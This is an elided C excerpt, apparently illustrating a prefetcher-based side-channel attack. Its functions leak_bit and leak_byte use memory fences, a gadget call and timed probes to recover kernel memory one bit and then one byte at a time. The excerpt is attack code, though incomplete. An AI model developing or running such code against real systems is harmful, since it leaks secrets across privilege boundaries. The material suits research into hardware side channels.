...
static uint64_t leak_bit(size_t offset, size_t stride) {
    ...
    mfence();
    gadget(colliding_buffer + 3 * stride);
    mfence();

    // faset access time -> was prefetched -> kernel_buffer was accessed -> secret bit is 1
    return probe(colliding_buffer + 4 * stride) < threshold;
}
...
static uint8_t leak_byte(size_t offset) {
    ...
    for(int bit = 0; bit < 8; bit ++) {
        ...
        // leak a single bit
        byte |= leak_bit(offset * 8 + bit, 512) << bit;
    }
    return byte;
}
